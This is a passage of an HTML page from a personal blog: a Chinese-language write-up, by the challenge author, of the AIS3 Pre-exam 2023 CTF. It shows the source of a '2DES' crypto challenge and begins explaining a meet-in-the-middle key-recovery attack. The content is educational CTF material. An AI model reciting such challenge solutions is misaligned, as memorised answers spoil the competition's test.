@@ -1,0 +1,1189 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Ching367436,臺中一中電腦資訊研習社 38th 副社長,Bamboofox 社長,書卷獎,資安,AIS3 最佳專題">
+    
+    <meta name="author" content="Ching367436">
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="https://blog.ching367436.me/ais3-pre-exam-2023-write-up/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+        <meta name="description" content="今年來幫 AIS3 Pre-exam 來出題，共出了 1 題 crypto（2DES），3 題 web（Login Panel, E-Portfolio, E-Portfolio baby），裡面是我的 write-up。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="AIS3 Pre-exam 2023 Write-up">
+<meta property="og:url" content="https://blog.ching367436.me/ais3-pre-exam-2023-write-up/">
+<meta property="og:site_name" content="Ching367436">
+<meta property="og:description" content="今年來幫 AIS3 Pre-exam 來出題，共出了 1 題 crypto（2DES），3 題 web（Login Panel, E-Portfolio, E-Portfolio baby），裡面是我的 write-up。">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://blog.ching367436.me/ais3-pre-exam-2023-write-up/myfirstctf-staff.webp">
+<meta property="article:published_time" content="2023-06-06T07:44:47.000Z">
+<meta property="article:author" content="Ching367436">
+<meta property="article:tag" content="ais3">
+<meta property="article:tag" content="ctf">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://blog.ching367436.me/ais3-pre-exam-2023-write-up/myfirstctf-staff.webp">
+    
+    
+        <!-- Google tag (gtag.js) -->
+        <script src="https://www.googletagmanager.com/gtag/js?id=G-PRRP5V9HFQ"></script>
+        <script>
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+
+        gtag('config', 'G-PRRP5V9HFQ');
+        </script>
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/favicon.ico" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/favicon.ico">
+    <meta name="theme-color" content="#A31F34">
+    <link rel="shortcut icon" href="/favicon.ico">
+    <!--- Page Info-->
+    
+    <title>
+        
+            AIS3 Pre-exam 2023 Write-up -
+        
+        Ching367436&#39;s blog
+    </title>
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+
+    <!--- Inject Part-->
+    
+        
+            
+    
+            
+    
+            
+                
+                    <meta http-equiv="Content-Security-Policy" content="
+  default-src 'self' https://*.clarity.ms https://c.bing.com https://*.google-analytics.com https://*.analytics.google.com https://*.googletagmanager.com https://giscus.app/ https://cdn.jsdelivr.net/ https://fonts.googleapis.com https://fonts.gstatic.com https://cloudflareinsights.com ; 
+  script-src 'self' 'unsafe-inline' 'unsafe-eval' https://*.clarity.ms https://c.bing.com https://*.googletagmanager.com https://giscus.app/ https://cdn.jsdelivr.net/ https://static.cloudflareinsights.com ; 
+  style-src 'unsafe-inline' 'self' https://giscus.app/ https://cdn.jsdelivr.net/ https://fonts.googleapis.com https://fonts.gstatic.com; 
+  img-src 'self' data: https://*.clarity.ms https://c.bing.com https://cdn.jsdelivr.net/ https://www.googletagmanager.com ;
+" />
+
+                
+    
+            
+                
+                    <script data-swup-reload-script type="text/javascript"> (function(c,l,a,r,i,t,y){ c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)}; t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i; y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y); })(window, document, "clarity", "script", "gh62bmw6cl"); </script>
+                
+    
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/assets/build/styles.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/GeistMono/geist-mono.css">
+
+    
+<link rel="stylesheet" href="/fonts/Geist/geist.css">
+
+    <!--- Font Part-->
+    
+    
+    
+        <link href="https://fonts.googleapis.com/css2?family=Noto+Sans+TC:wght@400&display=swap" rel="stylesheet">
+    
+    
+        <link href="https://fonts.googleapis.com/css2?family=Lexend:wght@400&display=swap" rel="stylesheet">
+    
+    
+    
+
+    <script id="hexo-configurations">
+    window.config = {"hostname":"blog.ching367436.me","root":"/","language":"en"};
+    window.theme = {"articles":{"style":{"font_size":"18px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":["竹狐隊長"]},"code_block":{"copy":true,"style":"mac","highlight_theme":{"light":"github","dark":"vs2015"},"font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":false,"recommendation":{"enable":true,"title":"推薦閱讀","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"dark"},"global":{"fonts":{"chinese":{"enable":true,"family":"Noto Sans TC","url":"https://fonts.googleapis.com/css2?family=Noto+Sans+TC:wght@400&display=swap"},"english":{"enable":true,"family":"Lexend","url":"https://fonts.googleapis.com/css2?family=Lexend:wght@400&display=swap"},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":true},"scroll_progress":{"bar":true,"percentage":false},"website_counter":{"url":"https://cn.vercount.one/js","enable":false,"site_pv":false,"site_uv":false,"post_pv":false},"single_page":true,"preloader":{"enable":false,"custom_message":null},"open_graph":true,"google_analytics":{"enable":true,"id":"G-PRRP5V9HFQ"}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"Ching367436's blog","subtitle":{"text":[],"hitokoto":{"enable":false,"show_author":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"style":"default","links":{"github":"https://github.com/Ching367436","instagram":null,"zhihu":null,"twitter":"https://twitter.com/Ching367436","email":"admin@ching367436.me","telegram":"https://t.me/Ching367436"},"qrs":[]}},"plugins":{"feed":{"enable":true},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.7.1","navbar":{"auto_hide":true,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"none","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Tags":{"path":"/tags/","icon":"fa-solid fa-tags"},"Categories":{"icon":"fa-solid fa-folder","path":"/categories/"},"About":{"icon":"fa-regular fa-user","path":"/about"}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"show_on_mobile":true,"links":null},"article_date_format":"auto","excerpt_length":200,"categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2023/3/20 21:33:14"};
+    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 7.3.0"><style>mjx-container[jax="SVG"] {
+  direction: ltr;
+}
+
+mjx-container[jax="SVG"] > svg {
+  overflow: visible;
+}
+
+mjx-container[jax="SVG"][display="true"] {
+  display: block;
+  text-align: center;
+  margin: 1em 0;
+}
+
+mjx-container[jax="SVG"][justify="left"] {
+  text-align: left;
+}
+
+mjx-container[jax="SVG"][justify="right"] {
+  text-align: right;
+}
+
+g[data-mml-node="merror"] > g {
+  fill: red;
+  stroke: red;
+}
+
+g[data-mml-node="merror"] > rect[data-background] {
+  fill: yellow;
+  stroke: none;
+}
+
+g[data-mml-node="mtable"] > line[data-line] {
+  stroke-width: 70px;
+  fill: none;
+}
+
+g[data-mml-node="mtable"] > rect[data-frame] {
+  stroke-width: 70px;
+  fill: none;
+}
+
+g[data-mml-node="mtable"] > .mjx-dashed {
+  stroke-dasharray: 140;
+}
+
+g[data-mml-node="mtable"] > .mjx-dotted {
+  stroke-linecap: round;
+  stroke-dasharray: 0,140;
+}
+
+g[data-mml-node="mtable"] > svg {
+  overflow: visible;
+}
+
+[jax="SVG"] mjx-tool {
+  display: inline-block;
+  position: relative;
+  width: 0;
+  height: 0;
+}
+
+[jax="SVG"] mjx-tool > mjx-tip {
+  position: absolute;
+  top: 0;
+  left: 0;
+}
+
+mjx-tool > mjx-tip {
+  display: inline-block;
+  padding: .2em;
+  border: 1px solid #888;
+  font-size: 70%;
+  background-color: #F8F8F8;
+  color: black;
+  box-shadow: 2px 2px 5px #AAAAAA;
+}
+
+g[data-mml-node="maction"][data-toggle] {
+  cursor: pointer;
+}
+
+mjx-status {
+  display: block;
+  position: fixed;
+  left: 1em;
+  bottom: 1em;
+  min-width: 25%;
+  padding: .2em .4em;
+  border: 1px solid #888;
+  font-size: 90%;
+  background-color: #F8F8F8;
+  color: black;
+}
+
+foreignObject[data-mjx-xml] {
+  font-family: initial;
+  line-height: normal;
+  overflow: visible;
+}
+
+.MathJax path {
+  stroke-width: 3;
+}
+
+mjx-container[display="true"] {
+  overflow: auto hidden;
+}
+
+mjx-container[display="true"] + br {
+  display: none;
+}
+</style><link rel="alternate" href="/atom.xml" title="Ching367436" type="application/atom+xml">
+</head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+<!--        <span class="swup-progress-icon">-->
+<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
+<!--        </span>-->
+    
+</div>
+
+
+
+<main class="page-container" id="swup">
+
+    
+
+    <div class="main-content-container">
+
+
+        <div class="main-content-header">
+            <header class="navbar-container px-6 md:px-12">
+
+    <div class="navbar-content ">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                Ching367436&#39;s blog
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/archives"
+                                        >
+                                    <i class="fa-regular fa-archive fa-fw"></i>
+                                    ARCHIVES
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/tags/"
+                                        >
+                                    <i class="fa-solid fa-tags fa-fw"></i>
+                                    TAGS
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/categories/"
+                                        >
+                                    <i class="fa-solid fa-folder fa-fw"></i>
+                                    CATEGORIES
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/about"
+                                        >
+                                    <i class="fa-regular fa-user fa-fw"></i>
+                                    ABOUT
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile sheet -->
+    <div class="navbar-drawer h-screen w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
+        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
+            
+                
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/archives"
+                        >
+                            <span>
+                                ARCHIVES
+                            </span>
+                            
+                                <i class="fa-regular fa-archive fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/tags/"
+                        >
+                            <span>
+                                TAGS
+                            </span>
+                            
+                                <i class="fa-solid fa-tags fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/categories/"
+                        >
+                            <span>
+                                CATEGORIES
+                            </span>
+                            
+                                <i class="fa-solid fa-folder fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/about"
+                        >
+                            <span>
+                                ABOUT
+                            </span>
+                            
+                                <i class="fa-regular fa-user fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+
+            
+            
+        </ul>
+
+        <div class="statistics flex justify-around my-2.5">
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">12</div>
+        <div class="label text-third-text-color text-sm">Tags</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">7</div>
+        <div class="label text-third-text-color text-sm">Categories</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">9</div>
+        <div class="label text-third-text-color text-sm">Posts</div>
+    </a>
+</div>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="main-content-body">
+
+            
+
+            <div class="main-content">
+
+                
+                    <div class="post-page-container flex relative justify-between box-border w-full h-full">
+    <div class="article-content-container">
+
+        <div class="article-title relative w-full">
+            
+                
+                
+                <img src="/ais3-pre-exam-2023-write-up/myfirstctf-staff.webp" alt="AIS3 Pre-exam 2023 Write-up" class="w-full h-60 sm:h-72 md:h-80 object-cover sm:rounded-t-large dark:brightness-75"/>
+                
+                <div class="w-full flex items-center absolute bottom-0 justify-start">
+                    <h1 class="article-title-cover text-center mx-6 my-6 text-second-text-color bg-background-color-transparent px-4 py-3 text-3xl sm:text-4xl md:text-5xl font-semibold backdrop-blur-lg rounded-xl border border-border-color ">AIS3 Pre-exam 2023 Write-up</h1>
+                </div>
+            
+            </div>
+
+        
+            <div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+                <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+                    <img src="/images/Ching367436.jpg">
+                </div>
+                <div class="info flex flex-col justify-between">
+                    <div class="author flex items-center">
+                        <span class="name text-default-text-color text-lg font-semibold">Ching367436</span>
+                        
+                            <span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">竹狐隊長</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2023-06-06 15:44:47</span>
+        <span class="mobile">2023-06-06 15:44:47</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+
+    
+        <span class="article-categories article-meta-item">
+            <i class="fa-regular fa-folders"></i>&nbsp;
+            <ul>
+                
+                
+                    
+                        
+                        <li>
+                            <a href="/categories/AIS3/">AIS3</a>&nbsp;
+                        </li>
+                    
+                    
+                
+                    
+                        
+                            <li>></li>
+                        
+                        <li>
+                            <a href="/categories/AIS3/Pre-exam/">Pre-exam</a>&nbsp;
+                        </li>
+                    
+                    
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fa-regular fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/ais3/">ais3</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/ctf/">ctf</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+        <span class="article-wordcount article-meta-item">
+            <i class="fa-regular fa-typewriter"></i>&nbsp;<span>2.8k Words</span>
+        </span>
+    
+    
+        <span class="article-min2read article-meta-item">
+            <i class="fa-regular fa-clock"></i>&nbsp;<span>12 Mins</span>
+        </span>
+    
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        
+
+
+        <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+            <h2 id="我出的題目"><a href="#我出的題目" class="headerlink" title="我出的題目"></a>我出的題目</h2><h3 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h3><h4 id="2DES"><a href="#2DES" class="headerlink" title="2DES"></a>2DES</h4><p><a class="link" target="_blank" rel="noopener" href="https://github.com/Ching367436/My-CTF-Challenges/tree/main/ais3-pre-exam/2023/crypto/2des/src">題目連結 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<ul>
+<li>解題人數<ul>
+<li>MyFirstCTF: 1 / 111 (score &gt;= 100)</li>
+<li>Pre-exam: 21 / 256 (score &gt;= 100)</li>
+</ul>
+</li>
+</ul>
+<p>這題考的 Meet-in-the-Middle attack，相信直接搜尋 <code>2DES</code> 就可以知道解題方向。為了怕題目太無聊，所以還加入了需要知道 DES 的一些性質的考點（不知道這個還是解的了）。</p>
+<h5 id="題目"><a href="#題目" class="headerlink" title="題目"></a>題目</h5><p>首先題目會隨機生成 <code>key1</code> <code>key2</code>，其中每個 byte 的前 4 個 bits 都被固定成 <code>1</code>。</p>
+<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Generate key and IV</span></span><br><span class="line"><span class="keyword">const</span> key1 = crypto.<span class="title function_">randomBytes</span>(<span class="number">8</span>)</span><br><span class="line"><span class="keyword">const</span> key2 = crypto.<span class="title function_">randomBytes</span>(<span class="number">8</span>)</span><br><span class="line"><span class="keyword">const</span> iv = <span class="title class_">Buffer</span>.<span class="title function_">concat</span>([<span class="title class_">Buffer</span>.<span class="title function_">from</span>(<span class="string">'AIS3 三'</span>)])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++) {</span><br><span class="line">    key1[i] = key1[i] | <span class="number">0b11110000</span></span><br><span class="line">    key2[i] = key2[i] | <span class="number">0b11110000</span></span><br><span class="line">}</span><br></pre></td></tr></table></figure></div>
+
+<p>接著會把用 <code>key1</code> <code>key2</code> 加密兩層後的 <code>FLAG</code> 以及 <code>hint_pt</code> 印出來，要透過 <code>res</code> <code>hint_pt</code> <code>hint</code> <code>iv</code> 想辦法解出 <code>FLAG</code>。</p>
+<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">res = <span class="title function_">encrypt</span>(<span class="title function_">encrypt</span>(<span class="variable constant_">FLAG</span>, key1, iv), key2, iv)</span><br><span class="line">hint = <span class="title function_">encrypt</span>(<span class="title function_">encrypt</span>(hint_pt, key1, iv), key2, iv)</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`let res = '<span class="subst">${res.toString(<span class="string">'hex'</span>)}</span>'`</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`let hint_pt = '<span class="subst">${hint_pt.toString(<span class="string">'hex'</span>)}</span>'`</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`let hint = '<span class="subst">${hint.toString(<span class="string">'hex'</span>)}</span>'`</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`let iv = '<span class="subst">${iv.toString(<span class="string">'hex'</span>)}</span>'`</span>)</span><br></pre></td></tr></table></figure></div>
+
+<h5 id="題解"><a href="#題解" class="headerlink" title="題解"></a>題解</h5><p>只要取得 <code>key1</code> <code>key2</code> 就可直接解出 <code>FLAG</code>，直接列舉 <code>key1</code> <code>key2</code> 的話會有 <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.186ex;" xmlns="http://www.w3.org/2000/svg" width="14.539ex" height="2.09ex" role="img" focusable="false" viewBox="0 -841.7 6426.3 923.7"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msup"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="TeXAtom" transform="translate(533,363) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mn"><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z"></path><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z" transform="translate(500,0)"></path></g></g></g><g data-mml-node="mo" transform="translate(1512.3,0)"><path data-c="D7" d="M630 29Q630 9 609 9Q604 9 587 25T493 118L389 222L284 117Q178 13 175 11Q171 9 168 9Q160 9 154 15T147 29Q147 36 161 51T255 146L359 250L255 354Q174 435 161 449T147 471Q147 480 153 485T168 490Q173 490 175 489Q178 487 284 383L389 278L493 382Q570 459 587 475T609 491Q630 491 630 471Q630 464 620 453T522 355L418 250L522 145Q606 61 618 48T630 29Z"></path></g><g data-mml-node="msup" transform="translate(2512.6,0)"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="TeXAtom" transform="translate(533,363) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mn"><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z"></path><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z" transform="translate(500,0)"></path></g></g></g><g data-mml-node="mo" transform="translate(4080.4,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="msup" transform="translate(5136.2,0)"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="TeXAtom" transform="translate(533,363) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mn"><path data-c="36" d="M42 313Q42 476 123 571T303 666Q372 666 402 630T432 550Q432 525 418 510T379 495Q356 495 341 509T326 548Q326 592 373 601Q351 623 311 626Q240 626 194 566Q147 500 147 364L148 360Q153 366 156 373Q197 433 263 433H267Q313 433 348 414Q372 400 396 374T435 317Q456 268 456 210V192Q456 169 451 149Q440 90 387 34T253 -22Q225 -22 199 -14T143 16T92 75T56 172T42 313ZM257 397Q227 397 205 380T171 335T154 278T148 216Q148 133 160 97T198 39Q222 21 251 21Q302 21 329 59Q342 77 347 104T352 209Q352 289 347 316T329 361Q302 397 257 397Z"></path><path data-c="34" d="M462 0Q444 3 333 3Q217 3 199 0H190V46H221Q241 46 248 46T265 48T279 53T286 61Q287 63 287 115V165H28V211L179 442Q332 674 334 675Q336 677 355 677H373L379 671V211H471V165H379V114Q379 73 379 66T385 54Q393 47 442 46H471V0H462ZM293 211V545L74 212L183 211H293Z" transform="translate(500,0)"></path></g></g></g></g></g></svg></mjx-container> 種可能，所以是不可行的。</p>
+<h6 id="Meet-in-the-Middle"><a href="#Meet-in-the-Middle" class="headerlink" title="Meet-in-the-Middle"></a>Meet-in-the-Middle</h6><p>這邊可以利用 meet-in-the-middle attack 幫我們把時間複雜度開個根號，具體如下。</p>
